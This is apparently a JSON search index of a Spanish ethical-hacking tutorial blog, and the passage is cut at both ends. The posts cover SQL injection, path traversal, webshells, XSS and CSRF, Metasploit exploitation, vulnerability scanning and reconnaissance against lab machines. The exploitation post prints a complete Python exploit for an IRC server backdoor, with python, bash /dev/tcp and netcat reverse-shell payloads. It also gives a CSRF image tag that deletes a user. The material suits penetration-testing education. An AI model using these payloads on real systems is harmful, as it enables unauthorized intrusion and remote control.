objetivo, para lo cual se aprovechan de vulnerabilidades presentes en aplicaciones web.Mediante la ejecución del código dañino que lleven asociadas pueden realizar un amplio abanico de actividades maliciosas. Pueden resultar sumamente peligrosas, más si tenemos en cuenta que son ataques muy difíciles de descubrir mediante pruebas funcionales, y se debe recurrir a un análisis del código fuente de la aplicación para descubrir estas inyecciones.La causa más habitual que propia estos ataques es la falta de una correcta validación de los datos de entrada y salida de la aplicación.SQL Injection (SQLi)La expansión en Internet de aplicaciones web que interactúan con bases de datos ha conllevado la aparición de estas vulnerabilidades en una gran cantidad de sitios web, convirtiéndose en uno de los mayores riesgos actuales para la seguridad de este tipo de entornos.Los efectos de este tipo de ataques pueden ir desde la consulta, la modificación o la eliminación de los datos almacenados, hasta lograr comprometer credenciales de usuarios, o llegar a tomar el control total del servidor donde se aloja la aplicación.Para poder probar si una página web presenta este tipo de vulnerabilidades es muy habitual la inclusión de determinados caracteres dentro de los parámetros de entrada, como &#39; o el uso de comparaciones matemáticas como 1=1 que nos permitan extraer conclusiones sobre la estructura y la información presente en la base de datos.Tipos de SQLiExisten tres tipos de ataques SQLi: Por error: son los más habituales y fáciles de explotar. Consiste en ir probando diferentes comandos SQL pasados como parámetros, y analizar la respuesta (y los errores) que nos devuelve la aplicación.SQLi por error Por unión: No se sustituye la consulta original que la aplicación realiza sobre la base de datos, sino que se concatena nuestra sentencia SQL detrás de la suya. El resultado obtenido será devuelto por la consulta inicial.SQLi por unión Ciego (Blind): es el más difícil de explotar, recurriendo a él cuando ninguno de los ataques anteriores haya tenido éxito. Consiste en ir haciendo preguntas del tipo si/no a la base de datos, y analizar los resultados que vamos obteniendo. Podemos encontrar algunos basados en contenido (por ejemplo, muéstrame la información si la respuesta es si, y no me la muestres si es no), basados en tiempo (por ejemplo, muéstrame los resultados de manera inmediata si la respuesta es sí, y muéstramela con un determinado retardo si es no. &#39;union select null, sleep(20), devolverá el resultado a los 20 segundos. Si tarda 20 segundos en devolver el resultado =&amp;gt; es vulnerable a ataques SQLi).SQLi ciego SQLmapDe todas las herramientas creadas para la automatización de ataques SQL destaca SQLmap. Se trata de una herramienta de código abierto que nos permite realizar inyecciones SQL de forma automática, pudiendo auditar de este modo los parámetros de entrada que tiene implementados una aplicación web determinada en busca de vulnerabilidades SQLi.Es capaz de detectar todos los tipos de vulnerabilidades SLQi (por error, por unión y ciegas) en un amplio abanico de bases de datos.A parte de todas estas características, incorpora funcionalidades adicionales que nos permitirán realizar otro tipo de ataques, como la subida de ficheros, inyección de comandos, fuerza bruta sobre los hashes de las contraseñas que haya podido recolectar e incluso escalada de privilegios dentro del sistema.Caso de usoPara ver si la web es vulnerable a estos ataques, podemos pasar a SQLmap la url que queremos probar o guardar en un fichero la petición que se realiza en un determinado formulario. Aquí se puede observar que el parámetro username es vulnerable al ataque.Ejecución de SQLmapOtra acción que podemos hacer, por ejemplo, es sacar los nombres de todas las tablas presentes en la base de datos, para ello ejecutar el siguiente comandoObtención de tablas con SLQmapPath TraversalUn directory traversal (o salto de directorio o cruce de directorio o path traversal) consiste en explotar una vulnerabilidad informática que ocurre cuando no existe suficiente seguridad en cuanto a la validación de un usuario, permitiéndole acceder a cualquier tipo de directorio superior (padre) sin ningún control.La finalidad de este ataque es ordenar a la aplicación a acceder a un archivo al que no debería poder acceder o no debería ser accesible. Este ataque se basa en la falta de seguridad en el código. El software está actuando exactamente como debe actuar y en este caso el atacante no está aprovechando un bug en el código.Directory traversal también es conocido como el ../ ataque punto punto barra, escalado de directorios y backtracking.Caso de usoVemos que la forma que tiene la web objetivo para obtener las páginas (archivos) es mediante el parámetro page:Analizando parámetros de la URLPara ver si es vulnerable, sustituimos el valor del parámetro page por otro en el que intentemos subir hasta la raíz de los ficheros del sistema y buscando alguno de los ficheros ubicados en esa ruta, en concreto passwdPath traversal para obtener el fichero de contraseñas del sistemaPodemos observar que es vulnerable porque nos muestra todas las contraseñas almacenadas en ese ficheroContraseñas extraídas gracias al Path traversalWebShellsUna WebShells no es una vulnerabilidad como tal, sino que es un script que vamos a inyectar en la máquina que está alojando la aplicación web, de manera que nosotros podamos ganar cosas como: la ejecución remota de comandos, persistencia en esa máquina, etcétera.Caso de usoPara inyectar la webshell en la máquina objetivo vamos a usar los conceptos vistos anteriormente -&amp;gt; sql injection + Path Traversal.Como sabemos que la web es vulnerable a los ataques SQLi, vamos a inyectar por medio de una consulta SQL un fichero que va a contener la webshell, aquí se puede observar la consulta SQLi:Insertando webShellEstamos inyectando un fichero con la webshell en la ruta ../../htdocs/mutillidae/backdoor.php la webshell que luego, por medio de la vulnerabilidad path traversal (pasar por la url el parámetro page=backdoor.php) vamos a usar. Por ejemplo, realizando un ls obtenemos esta información:Ejecutando comandos en la webShellUnrestricted File UploadProbablemente esta sea la vulnerabilidad que más fácilmente nos permite comprometer una máquina objetivo.Es tan sencillo como aprovechar que la página web nos permite subir ficheros para subir una webshell. Si tengo la suerte de que me lo incluye en un directorio que sea accesible desde el navegador podríamos usarlo sin problema.Caso de usoAccedemos al formulario que nos permite subir ficheros y seleccionamos aquel fichero que contenta la webshell (la misma utilizada en el apartado anterior). Al subirlo, podemos ver que nos indica la ruta en la que ha subido el fichero, si accedemos a él mediante Path Traversal ya tendríamos control sobre la webshellAprovechando formulario para subir la webShellHTML Injection y Cross-Site-Scripting (XSS)La inyección HTML es un tipo de vulnerabilidad de inyección que se produce cuando un usuario es capaz de controlar un punto de entrada y es capaz de inyectar código HTML arbitrario en una página web vulnerable.Cross-site scripting es un tipo de vulnerabilidad informática o agujero de seguridad típico de las aplicaciones Web, que puede permitir a una tercera persona inyectar en páginas web visitadas por el usuario código JavaScript o en otro lenguaje similar.Caso de usoExisten 3 tipos de ataques XSS: XSS Reflected:El cross-site scripting reflejado (o XSS) surge cuando una aplicación recibe datos en una petición HTTP e incluye esos datos en la respuesta inmediata de forma insegura. Supongamos que un sitio web tiene una función de búsqueda que recibe el término de búsqueda proporcionado por el usuario en un parámetro de la URL:https://insecure-website.com/search?term=gift La aplicación se hace eco del término de búsqueda suministrado en la respuesta a esta URL:&amp;lt;p&amp;gt;You searched for: gift&amp;lt;/p&amp;gt; Asumiendo que la aplicación no realiza ningún otro procesamiento de los datos, un atacante puede construir un ataque como estehttps://insecure-website.com/search?term=&amp;lt;script&amp;gt;/*+Malo+aquí...+*/&amp;lt;/script&amp;gt; Esta URL da lugar a la siguiente respuesta:&amp;lt;p&amp;gt;You searched for: &amp;lt;script&amp;gt;/* Bad stuff here... */&amp;lt;/script&amp;gt;&amp;lt;/p&amp;gt; Si otro usuario de la aplicación solicita la URL del atacante, entonces el script suministrado por el atacante se ejecutará en el navegador del usuario víctima, en el contexto de su sesión con la aplicación. ¿Esto qué quiere decir?, ¿Cómo podemos aprovecharlo? Que podríamos crear un ataque de pishing donde pasaríamos la url que queremos que ejecuten nuestros objetivos, teniendo como script un código, que por ejemplo, solicite inicio de sesión y envíe dichas credenciales a un servidor que tengamos a la escucha. Diagrama ataque XSS Reflected XSS Persistent: Los ataques de Cross-site Scripting persistente (XSS almacenado) representan uno de los tres tipos principales de Cross-site Scripting. Los otros dos tipos de ataques de este tipo son el XSS no persistente (XSS reflejado) y el XSS basado en el DOM. En general, los ataques XSS se basan en la confianza de la víctima en una aplicación o sitio web legítimo pero vulnerable. Un ataque XSS persistente es posible cuando un sitio web o una aplicación web almacena la entrada del usuario y posteriormente la sirve a otros usuarios. Una aplicación es vulnerable si no valida la entrada del usuario antes de almacenar el contenido e incrustarlo en las páginas de respuesta HTML. Los atacantes utilizan las páginas web vulnerables para inyectar código malicioso y almacenarlo en el servidor web para su uso posterior. El payload se sirve automáticamente a los usuarios que navegan por las páginas web y se ejecuta en su contexto. Así, las víctimas no necesitan hacer click en un enlace malicioso para ejecutar el payload (como en el caso del XSS no persistente). Todo lo que tienen que hacer es visitar una página web vulnerable. Diagrama ataque XSS PersistentCross-site request forgery (CSRF)Se relaciona muchísimo con estos dos fallos anteriores (HTML Injection y Cross-Site-Scripting) y que incluso yo puedo llegar a considerar casi más un tipo de payload de Cross-Site-Scripting.Es como si nosotros estuviésemos explotando un Cross-Site-Scripting que podría ser Reflect o Persistent, pero insertando un JavaScript o cualquier tipo de código que va a provocar que el usuario realice algún tipo de acción sobre esa aplicación web en la que está logueado y que nos pueda resultar en un beneficio.Caso de usoImaginemos que nuestra web objetivo es un foro privado, eso quiere decir que el registro de usuarios solo se puede hacer si algún miembro del foro te invita. Podríamos utilizar un Cross-Site-Scripting donde el payload se encargue de realizar el registro aprovechando que algún usuario logueado caiga en nuestro Cross-Site-Scripting. De esta forma, dicho usuario nos estaría invitando al foro sin que él lo supiera.Diagrama ataque CSRFOtro ejemplo puede ser:Un ejemplo muy clásico se da cuando un sitio web, llamémoslo &quot;example1.com&quot;, posee un sistema de administración de usuarios. En dicho sistema, cuando un administrador se conecta y ejecuta el siguiente REQUEST GET, elimina al usuario de ID: “63”: http://example1.com/usuarios/eliminar/63Una forma de ejecutar la vulnerabilidad CSRF, se daría si otro sitio web, llamemos “example2.com”, en su sitio web añade el siguiente código HTML: &amp;lt;img src=&quot;http://example1.com/usuarios/eliminar/63&quot;&amp;gt;Cuando el usuario administrador (conectado en example1.com) navegue por este sitio atacante, su navegador web intentará buscar una imagen en la URL y al realizarse el REQUEST GET hacia esa URL eliminará al usuario 63.XSStrike (Automatización de ataques XSS)XSStrike es una suite de detección de Cross Site Scripting equipada con cuatro analizadores escritos a mano, un generador inteligente de payloads, un potente motor de fuzzing y un crawler increíblemente rápido.En lugar de inyectar payloads y comprobar que funcionan, como hacen todas las demás herramientas, XSStrike analiza la respuesta con múltiples analizadores sintácticos y, a continuación, crea payloads cuyo funcionamiento está garantizado por el análisis de contexto integrado con un motor de fuzzing.Caso de usoEjecutamos el programa indicando la url sobre la que queremos realizar el XSS. Dice que ha encontrado 5 XSS reflected y nos genera payloads personalizados para explotar la vulnerabilidad.Detección de XSS mediante XSStrike" }, { "title": "Explotación de vulnerabilidades en Hosts", "url": "/posts/seg-ofensiva-explotacion-vuln-host/", "categories": "Ciberseguridad, Seguridad Ofensiva", "tags": "Pentesting, Metasploit, Armitage, NMAP, Exploit, Payload", "date": "2021-07-04 03:17:00 +0200", "snippet": "Durante los posts anteriores hemos visto métodos para recopilar y analizar información sobre nuestros objetivos. Durante este post veremos como explotar (en Hosts) aquellas vulnerabilidades que presentan.Contenido Objetivo Explotación manual de vulnerabilidades Caso de uso Explotación automática de vulnerabilidades Metasploit Componentes Módulos Comandos Caso de uso Importando a Metasploit análisis de vulnerabilidades (de Nessus) Armitage, interfaz gráfica de Metasploit ObjetivoConsiste en el uso de técnicas que permiten al analista aprovechar una vulnerabilidad identificada (sección análisis de vulnerabilidades) para obtener algún beneficio. Se corresponde con una de las fases más importantes e intrusivas del proceso de Hacking Ético. Deben tenerse muy en cuenta las herramientas de protección y detección que utiliza la organización (Antivirus, EDR, IPS, IDS, HIDS, WAF, etc).Se puede realizar de dos maneras: Explotación manual. Explotación automática.Explotación manual de vulnerabilidadesUna vez halladas vulnerabilidades gracias a las fases anteriores, podemos explotar dichas vulnerabilidades de manera manual, para ello debemos seguir los siguientes pasos: Buscar la vulnerabilidad. Buscar/crear el exploit. Incluir un payload en el exploit. Ejecutar el exploit contra la máquina objetivo para intentar ganar acceso.Caso de usoComo ejemplo, vamos a realizar una explotación manual sobre la máquina objetivo usada en fases anteriores. En concreto sobre este servicio, el irc, presente en el puerto 6667 de la máquina objetivo. Podemos observar que hay un backdoor que nos va a permitir ganar acceso a la máquina.Vulnerabilidad IRCCreamos o buscamos un exploit para aprovechar esa vulnerabilidad. En este caso hemos encontrado un exploit en internet con el siguiente código:#!/usr/bin/python3import argparseimport socketimport base64# Sets the target ip and port from argparseparser = argparse.ArgumentParser()parser.add_argument(&#39;ip&#39;, help=&#39;target ip&#39;)parser.add_argument(&#39;port&#39;, help=&#39;target port&#39;, type=int)parser.add_argument(&#39;-payload&#39;, help=&#39;set payload type&#39;, required=True, choices=[&#39;python&#39;, &#39;netcat&#39;, &#39;bash&#39;])args = parser.parse_args()# Sets the local ip and port (address and port to listen on)local_ip = &#39;&#39; # CHANGE THISlocal_port = &#39;&#39; # CHANGE THIS # The different types of payloads that are supportedpython_payload = f&#39;python -c &quot;import os;import pty;import socket;tLnCwQLCel=\\&#39;{local_ip}\\&#39;;EvKOcV={local_port};QRRCCltJB=socket.socket(socket.AF_INET,socket.SOCK_STREAM);QRRCCltJB.connect((tLnCwQLCel,EvKOcV));os.dup2(QRRCCltJB.fileno(),0);os.dup2(QRRCCltJB.fileno(),1);os.dup2(QRRCCltJB.fileno(),2);os.putenv(\\&#39;HISTFILE\\&#39;,\\&#39;/dev/null\\&#39;);pty.spawn(\\&#39;/bin/bash\\&#39;);QRRCCltJB.close();&quot; &#39;bash_payload = f&#39;bash -i &amp;gt;&amp;amp; /dev/tcp/{local_ip}/{local_port} 0&amp;gt;&amp;amp;1&#39;netcat_payload = f&#39;nc -e /bin/bash {local_ip} {local_port}&#39;# our socket to interact with and send payloadtry: s = socket.create_connection((args.ip, args.port))except socket.error as error: print(&#39;connection to target failed...&#39;) print(error) # craft out payload and then it gets base64 encodeddef gen_payload(payload_type): base = base64.b64encode(payload_type.encode()) return f&#39;echo {base.decode()} |base64 -d|/bin/bash&#39;# all the different payload options to be sentif args.payload == &#39;python&#39;: try: s.sendall((f&#39;AB; {gen_payload(python_payload)} \\n&#39;).encode()) except: print(&#39;connection made, but failed to send exploit...&#39;)if args.payload == &#39;netcat&#39;: try: s.sendall((f&#39;AB; {gen_payload(netcat_payload)} \\n&#39;).encode()) except: print(&#39;connection made, but failed to send exploit...&#39;)if args.payload == &#39;bash&#39;: try: s.sendall((f&#39;AB; {gen_payload(bash_payload)} \\n&#39;).encode()) except: print(&#39;connection made, but failed to send exploit...&#39;) #check display any response from the serverdata = s.recv(1024)s.close()if data != &#39;&#39;: print(&#39;Exploit sent successfully!&#39;)El exploit abre un socket contra la máquina objetivo que indiquemos por parámetros (exploit.py &amp;lt;ip_objetivo&amp;gt; &amp;lt;puerto_objetivo&amp;gt; -payload &amp;lt;python/netcat/bash&amp;gt;) y envía un payload con el objetivo de establecer una conexión reversa (reverse shell) con nuestra máquina (establecer las variables local_ip y local_port). Necesitamos colocar un “listener” sobre el puerto que hemos indicado en local_port para que la máquina objetivo establezca conexión. Si usamos netcat sería -&amp;gt; nc -l -p &amp;lt;local_port&amp;gt;. Si todo sale de manera satisfactoria, en la misma terminal donde pusimos el listener aparecerá la shell de la máquina objetivo.[IMPORTANTE] –&amp;gt; ¿Por qué existe el mismo payload en distintos lenguajes? No sabemos qué interpretes tiene instalado la máquina destino. Si no tiene instalado el interprete de python no entenderá el payload que le hemos enviado. Por esta razón hay más de uno.Explotación automática de vulnerabilidadesLa lista de vulnerabilidades de la máquina objetivo recopiladas puede ser muy grande, realizar una explotación manual sobre todas ellas puede llegar a ser tedioso y lento. Por esta razón existen herramientas que se encargan de automatizar esta fase.MetasploitProyecto Open Source que busca ofrecer herramientas para la creación y ejecución de exploits que aprovechen las vulnerabilidades halladas en las auditorías de seguridad.A continuación, veremos de forma breve la composición de Metasploit, sus comandos principales y la manera en que podemos utilizarlo.ComponentesMetasploit es considerado un framework en el que están integradas un conjunto de herramientas cada una de las cuales nos ofrece una función determinada. Componente Funcionalidad msfvenom Integra msfpayload, que se encarga de la generación de payloads en diferentes lenguajes de programación, y la posibilidad de inyectarlos en otros archivos. También integra msfencode, que ofrece ofuscación a payloads. msfd Gestor de conexiones remotas de Metasploit. Ofrece un servicio que queda a la escucha en un puerto determinado. msfconsole Componente que permite la ejecución de módulos mediante una interfaz de línea de comandos. El que más nos interesa es el último de la lista, msfconsole, ya que es el que nos va a permitir explotar las vulnerabilidades encontradas durante la auditoría.MódulosUn módulo no es más que un código desarrollado para llevar a cabo una o varias acciones determinadas. Dentro de msfconsole disponemos de un importante número de ellos (se van actualizando de manera continua gracias a la comunidad), pero si necesitamos algo más especifico tenemos la posibilidad de programar nosotros mismos el nuestro.Existen 7 tipos de módulos: Nombre módulo Descripción Exploits Módulos encargados de explotar alguna vulnerabilidad. Auxiliary Módulos que ofrecen funcionalidades extra. Desde búsqueda pasiva hasta activa. Post Módulos dedicados a labores post-explotación. Son comunes en este apartado las tareas de mantenimiento de la conexión con la máquina objetivo, el robo periódico de información, el pivoting entre diferentes máquinas o el escalado de privilegios. Payloads Módulos que realizan acciones determinadas dentro del sistema en el que hemos conseguido penetrar. Encoders Se encargan de hacer más difíciles de detectar, por antivirus o sistemas de detección de intrusos, los códigos generados mediante otros módulos. NOPs Contienen herramientas que generar instrucciones NOPs (nulas) en ensamblador para los payloads con los que trabajaremos. Evasion Permiten llevar a cabo técnicas de evasión ante la protección de los antivirus. ComandosHay un conjunto de comandos principales que nos van a permitir comenzar a trabajar con Metasploit. Para empezar nos quedamos con los siguientes: Comando Descripción help Muestra la ayuda de la aplicación. show Muestra las opciones que tiene aquello sobre lo que se consulta. set Comando que otorga un valor determinado a un parámetro. setg La misma función que set, pero a nivel global de la aplicación. search Busca coincidencias sobre aquello que busquemos dentro del contenido de Metasploit. info Propociona información sobre el módulo que consultemos. save guarda la configuración que hay en el momento de ejectuarlo. De modo que puede ser recuperada en cualquier momento. use Indica al framework el módulo que se va a utilizar para que lo cargue en la consola. run Para ejecutar módulos tipo auxiliary. exploit Ejecuta el exploit que tengamos cargado en ese momento, con la configuración que hayamos establecido. back Comando de retroceso durante el uso de Metasploit. check Evalúa si el host objetivo es vulnerable al módulo que hemos escogido. sessions Gestor de conexiones abiertas con hosts objetivos. Mediante las opciones del comando podremos ir moviéndonos entre todas las conexiones que tengamos. Caso de usoVamos a explotar la vulnerabilidad que explotamos de manera manual en el apartado anterior.Lo primero que hay que hacer es buscar las coincidencias que haya de la vulnerabilidad unrealirc dentro de Metasploit, para ello ejecutamos el comando search unrealirc. Obteniendo la siguiente salida:Buscando exploit en MetasploitEn este caso solo encuentra un exploit, para usarlo ejecutamos el siguiente comando use &amp;lt;nombre_módulo&amp;gt;, en este caso, nombre_módulo = exploit/unix/irc/unreal_ircd_3281_backdoor. Una vez hecho, se entra al módulo para configurarlo (ver que aparece en rojo el módulo que estamos configurando).Para ver qué hay que configurar del módulo, ejecutar el comando show options (con show advanced veremos la configuración avanzada), obtendremos la siguiente salida:Configurando opciones del exploit en MetasploitEn este caso nos pide dos parámetros, la ip de la máquina objetivo (RHOSTS) y el puerto (RPORT) que ya viene configurada en el puerto por defecto de ese servicio. Para configurar la ip, ejecutar el comando set rhosts &amp;lt;ip&amp;gt;.Si ahora ejecutamos el exploit mediante el comando exploit ejecutará todos los exploit configurados. El problema es que en nuestro caso hemos configurado un exploit pero no hemos definido el payload que va a usar. Por eso obtenemos el siguiente resultado:Asignando payload en MetasploitPara añadir un payload al exploit, primero debemos saber cuales son compatibles con nuestro exploit, para ello ejecutamos el comando show payloads. Escogemos el que queramos mediante el comando set payload &amp;lt;payload&amp;gt;.Si volvemos a ejecutar el comando exploit veremos que todo sale correctamente y obtenemos una shell reversa de la máquina objetivo.Importando a Metasploit análisis de vulnerabilidades (de Nessus)Además de los comandos que vimos anteriormente, Metasploit incorpora otro conjunto de comandos denominados “Database Backend” que permiten recopilar información desde varias fuentes externas y almacenarlas en una base de datos propia para poder utilizarla posteriormente. Comando Descripción db_import Importa los datos de un fichero a la base de datos de Metasploit. db_export Exporta el contenido de la base de datos a un fichero. hosts Muestra todos los objetivos que tenemos en la base de datos. services Muestra todos los servicios que tenemos en la base de datos. vulns Muestra todas las vulnerabilidades que hay almacenadas en la base de datos. Para obtener los resultados del análisis de Nessus, accedemos a su interfaz gráfica y exportamos en análisis (formato .nessus).Análisis realizado en NessusEse archivo (.nessus) es el que vamos a importar en Metasploit por medio del comando db_import &amp;lt;nombre_fichero&amp;gt;.nessus.Importando análisis de Nessus a MetasploitSi queremos saber qué objetivos tiene nuestro análisis, podemos ejecutar el comando Hosts. Si queremos ver qué servicios tiene habilitados un objetivo en concreto, ejecutar el comando services &amp;lt;ip&amp;gt;. Si queremos saber las vulnerabilidades que presenta un objetivo, ejecutar el comando vulns &amp;lt;ip&amp;gt;.Buscando vulnerabilidades halladas en el análisis de NessusArmitage, interfaz gráfica de MetasploitPresenta una interfaz gráfica para realizar las mismas acciones que desde la terminalInterfaz gráfica ArmitagePor ejemplo, podemos aprovechar la misma vulnerabilidad que aprovechamos antes (unrealirc). Como se puede observar presenta los mismos parámetros que tuvimos que rellenar en el caso de uso anterior.Explotando vulnerabilidad IRC en armitage" }, { "title": "Análisis de vulnerabilidades", "url": "/posts/seg-ofensiva-analisis-vulnerabilidades/", "categories": "Ciberseguridad, Seguridad Ofensiva", "tags": "Pentesting, CVE, CVEDetails, CVSS, CPE, NMAP, Nessus", "date": "2021-06-29 05:35:00 +0200", "snippet": "Durante esta sección veremos las diferentes alternativas, tanto manuales como automáticas, de las que disponemos para realizar análisis de vulnerabilidades sobre un objetivo.Contenido Objetivo CVE, CVSS, CPE ¿Cómo buscamos vulnerabilidades asociadas a una aplicación/protocolo/servicio? (CVE) ¿Cómo de peligrosa es una vulnerabilidad? (CVSS) ¿Cómo saber a cuántas versiones afecta esta vulnerabilidad? (CPE) Web alternativa Herramientas automáticas para el análisis de vulnerabilidades NMAP Nessus Puesta en marcha Caso de uso Otras herramientas ObjetivoLlegados a este punto ya hemos recopilado información de nuestro objetivo mediante técnicas más o menos intrusivas. Ahora tenemos que encontrar problemas de seguridad en esos sistemas. En la siguiente sección (6. Explotación y hacking de vulnerabilidades) veremos cómo explotar los fallos de seguridad encontramos en esta sección para por ejemplo: ganar acceso al sistema, elevar privilegios, poderse mover lateralmente por la red, etcEl tipo de fallos abarca desde errores en la configuración de un servicio hasta vulnerabilidades en determinados servicios que sean públicos y puedan comprometer la integridad del mismoCVE, CVSS, CPEDurante el escaneo nmap que hicimos en fases anteriores vimos el conjunto de servicios que tenía el servidor. Con dicha información podemos comenzar a buscar vulnerabilidades. En este caso vamos a analizar si la aplicación ProFTDP con versión 1.3.5 presenta alguna vulnerabilidad.Análisis Nmap¿Cómo buscamos vulnerabilidades asociadas a una aplicación/protocolo/servicio? (CVE)Se puede usar el repositorio CVE (Common Vulnerabilities and Exposures ) para buscar vulnerabilidades reportadas. Ya que es una lista de información registrada sobre vulnerabilidades de seguridad conocidas, en la que cada referencia tiene un número de identificación CVE-ID, descripción de la vulnerabilidad, que versiones del software están afectadas, posible solución al fallo (si existe) o como configurar para mitigar la vulnerabilidad y referencias a publicaciones o entradas de foros o blog donde se ha hecho pública la vulnerabilidad o se demuestra su explotación. Además suele también mostrarse un enlace directo a la información de la base de datos de vulnerabilidades del NIST (NVD), en la que pueden conseguirse más detalles de la vulnerabilidad y su valoración.Realizamos la búsqueda y encontramos que hay una vulnerabilidad reportada. En las referencias podemos ver mucha información sobre la vulnerabilidad, y hasta incluso un exploit (se verá en la fase de explotación).CVE¿Cómo de peligrosa es una vulnerabilidad? (CVSS)En CVSS (Common Vulnerability Scoring System) podemos ver el nivel de peligrosidad de una vulnerabilidad.Si buscamos la vulnerabilidad de antes, podemos observar que es una vulnerabilidad con una puntuación de 10. Por lo que se trata de una vulnerabilidad crítica.CV3¿Cómo saber a cuántas versiones afecta esta vulnerabilidad? (CPE)Mediante el CPE (Common Platform Enumeration). Es un esquema de nomenclatura estructurado para sistemas, software y paquetes de tecnología de la información. Basado en la sintaxis genérica de los Identificadores Uniformes de Recursos (URI), CPE incluye un formato de nombre formal, un método para comprobar los nombres con un sistema y un formato de descripción para vincular texto y pruebas a un nombre.CV4Web alternativaExiste otra web alternativa (cvedetails) donde se aglutina toda la información recopilada en las webs que hemos visto hace un momento (consulta las APIs de CVE Y CVSS).Herramientas automáticas para el análisis de vulnerabilidadesEn vez de realizarlo de manera manual, podemos usar una serie de aplicaciones que automaticen el análisis de las posibles vulnerabilidades presentes en un objetivo. Como pros: se hace un escaneo global y automático, evitamos hacer el escaneo puerto por puerto de forma manual. Como contras: genera mucho ruido. Puede no encontrar todas las vulnerabilidades, ejemplo: seguir leyendo.NMAPNMAP presenta una serie de scripts categorizados que nos facilitan el trabajo. Una de esas categorías es la de vulnerabilidades, en concreto, vuln –&amp;gt; These scripts check for specific known vulnerabilities and generally only report results if they are found.Mediante ese script NMAP va a hacer un análisis de vulnerabilidades sobre el objetivo que indiquemos. Ejecutando el comando sudo nmap -v -sS --script=vuln &amp;lt;ip_objetivo&amp;gt; se empezará a realizar ese análisis. Al cabo de unos minutos se mostrará por consola toda la información recopilada. Es recomendable exportar este resultado para que sea más legible, para ello, ejecutamos el siguiente comando sudo nmap -v -sS --script=vuln --stylesheet=&quot;https://svn.nmap.org/nmap/docs/nmap.xsl&quot; &amp;lt;ip_objetivo&amp;gt;. Este comando producirá la siguiente salida:Nmap analisis de vulnerabilidades[IMPORTANTE] –&amp;gt; Como dato curioso: hemos escaneado el mismo objetivo que escaneamos de forma manual, y en el puerto 21 nmap no ha sido capaz de encontrar la vulnerabilidad asociada con la aplicación ProFTDP. El uso de nmap con ese script para el análisis de vulnerabilidades no es infalible.NessusEs sin lugar a dudas la herramienta más potente que podemos encontrar para el análisis de vulnerabilidades tanto de sistemas como de entornos web, ya que dispone del mayor repositorio de pruebas de vulnerabilidades del mercado.Desarrollada por la empresa Tenable, en cuya web podemos descargar la versión gratuita Essentials, la cual tiene funcionalidades limitadas.Está compuesta por 2 componentes: Un demonio, llamado nessusd Un cliente web que nos permite interactuar con la aplicación.Puesta en marchaUna vez descargado de su página oficial, debemos arrancar el demonio de la siguiente forma /etc/init.d/nessusd start. Una vez arrancado, podemos ir al puerto 8834 de nuestro localhost para acceder al cliente web.Encontramos una serie de plantillas que nos provee Nessus para iniciar ciertas acciones, como se puede ver en la siguiente imagen.NessusCaso de usoSi ejecutamos un escaneo de puertos sobre el rango 192.168.236.0/24 obtenemos los siguiente resultados:Nessus2Si ejecutamos un análisis de vulnerabilidades sobre el mismo rango anterior, obtenemos los siguientes resultados:Nessus3Al igual que nos pasó con nmap, no ha identificado la vulnerabilidad de la aplicación ProFTDP sobre el puerto 21. Esto se debe a que Nessus funciona mediante plugins, es decir, cada plugin se encarga de realizar búsquedas de un conjunto de vulnerabilidades. En este caso no está instalado. Esta es la razón por la que Nessus es tan utiliza, porque los plugins son creados por la comunidad y actualizados con mucha frecuencia.Si queremos realizar un escaneo exhaustivo, podemos hacerlo mediante la opción “Advanced Scan”. Esta opción por defecto utiliza todos los plugins presentes en Nessus, lo cual nos permite analizar los objetivos de manera completa. La única desventaja de este escaneo es que es muy intrusivo. La salida de este “Advanced Scan” es la que podemos ver a continuación:Nessus4Como se puede comprobar, ahora arroja una gran cantidad de vulnerabilidades. Esta es una forma rápida y sencilla de analizar nuestros objetivos. Si queremos exportar el resultado del análisis, usar el botón “Export” en la esquina superior derecha.Otras herramientasLa más conocida y utilizada es Nessus, pero hay otras alternativas: Nombre Propietario Licencia Plataforma Acunetix Acunetix Comercial/gratis Windows/Linux AppScan IBM Comercial Windows Qualys Qualys Comercial Cloud " }, { "title": "Recopilación Activa de información", "url": "/posts/seg-ofensiva-reco-activa/", "categories": "Ciberseguridad, Seguridad Ofensiva", "tags": "Pentesting, Metasploitable3, NMAP, DNSrecon", "date": "2021-06-21 07:35:00 +0200", "snippet": "En esta sección se han recopilado algunas de las principales herramientas usadas durante la fase de recopilación activa de información. Antes de continuar… ¿Dónde entra el concepto de anonimato? ¿Qué es lo que tratamos de conseguir con las técnicas que intentar garantizar el anonimato en Internet? ¡¡A tener en cuenta!! LEER ANTES DE SEGUIR CON EL RESTO Importancia del anonimato Objetivo Presentación del entorno vulnerable: Metasploitable3. DNSrecon y transferencia de zona Nmap Descubrimiento de Hosts Escaneo de puertos Descubrimiento de servicios Identificación del sistema operativo Antes de continuar…¿Dónde entra el concepto de anonimato?Utilizando algún método para garantizar el anonimato como puede ser una VPN, un proxy, red tor,… de manera genérica lo que estamos haciendo es tunelizar nuestro tráfico de red aplicando algún tipo de cifrado desde una máquina en nuestra red doméstica/local hasta un servidor en Internet que se encargará de descifrar el tráfico y realizar la petición a donde nosotros queramos dirigirla. Es importante entender, que aunque el contenido del tráfico de red vaya cifrado, ese tráfico de red sigue pasando por nuestro router para poder llegar al servidor que lo descifra y, por lo tanto, nuestro router sigue estando expuesto a Internet.El riesgo de seguridad al que estamos expuestos todos, independientemente de utilizar mecanismos para garantizar el anonimato o no, es a la explotación de un posible fallo de seguridad en nuestro router de manera que permita ganar acceso a los sistemas que se encuentren conectados a nuestra red local. Este riesgo no puede mitigarse por completo debido a que el router tiene que estar expuesto a Internet para poder habilitar la conexión de los dispositivos que se encuentran en nuestra red privada.¿Qué es lo que tratamos de conseguir con las técnicas que intentar garantizar el anonimato en Internet?Con este tipo de técnicas y herramientas tratamos de garantizar la privacidad y confidencialidad de nuestras conexiones. De esta manera, cuando nos conectamos a una máquina en Internet, por ejemplo un servidor de aplicación que proporciona una página web, lo hacemos a través de una o varias máquinas intermedias con las que establecemos una comunicación cifrada.Aquí hay varias cosas que se deben tener en cuenta. Las máquinas que se utilizan para salir a internet cuando utilizas mecanismos de anonimato como una VPN, tienen que descifrar tu tráfico de red y, por lo tanto, pueden monitorizarlo y registrarlo. Si realizas cualquier tipo de actividad ilegal utilizando estos mecanismos, nada te garantiza que no vayas a ser identificado, sobre todo si estás utilizando un servicio gratuito.Como reitero en varias ocasiones, no debería utilizarse ninguna técnica de hacking que sea ilegal sobre un sistema o una organización con la que no tienes un contrato establecido para la realización de un hacking ético. En caso contrario, utilices o no técnicas que garanticen el anonimato, te estás exponiendo a que ser identificado.¡¡A tener en cuenta!! LEER ANTES DE SEGUIR CON EL RESTOEn secciones anteriores no se presentan 